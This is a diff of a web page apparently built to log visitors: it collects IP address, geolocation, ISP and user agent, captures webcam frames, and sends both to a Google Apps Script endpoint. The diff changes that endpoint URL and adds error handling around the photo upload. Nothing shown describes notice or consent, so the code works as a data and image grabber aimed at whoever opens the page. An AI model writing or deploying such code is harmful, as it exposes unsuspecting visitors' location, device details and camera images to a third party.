@@ -6,7 +6,7 @@
   <title>IP 與設備訊息記錄</title>
 </head>
 <body>
-  <h1>IP 與設備訊ccc息記錄</h1>
+  <h1>IP 與設備訊cccccs息記錄</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">尚未開始操作</p>
   <video id="video" autoplay playsinline width="320" height="240"></video>
@@ -28,7 +28,7 @@
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
         // 發送 GET 請求到 Google Apps Script
-        const url = new URL('https://script.google.com/macros/s/AKfycbx5msS3bFMb2ag--lQS8zBGXJ41rg2LcJFAYxOXiqgdvbhiyk1RlcK-Y5qJ9pvV-BCOtQ/exec'); // 替換為您的 URL
+        const url = new URL('https://script.google.com/macros/s/AKfycbxkoqrUKs9YoLOiazUxTRuuITld2_1QmHMo7fHn5WEVgPtuwKoolzTrwBICOsZhxXvcMw/exec'); // 替換為您的 URL
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -63,19 +63,22 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       // 壓縮圖片大小
-      canvas.toBlob(async (blob) => {
+          canvas.toBlob(async (blob) => {
+      try {
+        // 確保壓縮邏輯在前端執行
         const compressedBlob = await compressImage(blob);
-
-        // 建立 FormData 並上傳
+    
+        // 構建 FormData 並附加壓縮後的圖片
         const formData = new FormData();
         formData.append('photo', compressedBlob, 'photo.jpg');
         formData.append('userAgent', navigator.userAgent);
-
-        const response = await fetch('https://script.google.com/macros/s/AKfycbx5msS3bFMb2ag--lQS8zBGXJ41rg2LcJFAYxOXiqgdvbhiyk1RlcK-Y5qJ9pvV-BCOtQ/exec', { // 替換為您的後端 URL
+    
+        // 發送圖片到後端
+        const response = await fetch('https://script.google.com/macros/s/AKfycbxkoqrUKs9YoLOiazUxTRuuITld2_1QmHMo7fHn5WEVgPtuwKoolzTrwBICOsZhxXvcMw/exec', {
           method: 'POST',
           body: formData,
         });
-
+    
         const result = await response.json();
         if (result.success) {
           console.log('照片上傳成功: ', result.photoUrl);
@@ -84,8 +87,12 @@
           console.error('照片上傳失敗: ', result.error);
           document.getElementById('status').innerText = `照片上傳失敗：${result.error}`;
         }
-      }, 'image/jpeg');
-    }
+      } catch (error) {
+        console.error('圖片上傳失敗: ', error);
+        document.getElementById('status').innerText = '圖片上傳失敗，請檢查控制台。';
+      }
+    }, 'image/jpeg', 0.8); // 確保壓縮品質設置為 0.8
+
 
     // 壓縮圖片
     async function compressImage(blob) {
